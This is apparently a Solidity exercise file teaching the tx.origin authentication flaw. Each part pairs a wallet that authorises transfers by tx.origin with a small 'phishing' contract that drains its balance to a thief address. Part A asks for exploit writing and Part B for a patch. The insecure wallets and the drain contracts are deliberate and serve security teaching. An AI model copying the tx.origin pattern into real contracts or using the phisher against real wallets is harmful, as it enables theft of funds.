// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
Exercise Type A (write exploit):
A1: Build phishing helper to drain wallet using tx.origin auth.
A2: Adapt helper for an approval function behind tx.origin.
*/
contract ExerciseA_TxOriginWallet {
    address public immutable owner;

    constructor(address walletOwner) payable {
        owner = walletOwner;
    }

    receive() external payable {}

    function transferAll(address payable to) external {
        require(tx.origin == owner, "not owner origin");
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "transfer failed");
    }
}

contract ExerciseA_PhishingTemplate {
    function trickOwner(ExerciseA_TxOriginWallet target, address payable thief) external {
        target.transferAll(thief);
    }
}

/*
Exercise Type B (write fix):
Vulnerable wallet + attacker primitive provided. Patch wallet only.
*/
contract ExerciseB_VulnerableWallet {
    address public immutable owner;

    constructor(address walletOwner) payable {
        owner = walletOwner;
    }

    receive() external payable {}

    function transferAll(address payable to) external {
        require(tx.origin == owner, "not owner origin");
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "transfer failed");
    }
}

contract ExerciseB_WorkingPhisher {
    function attack(ExerciseB_VulnerableWallet target, address payable thief) external {
        target.transferAll(thief);
    }
}
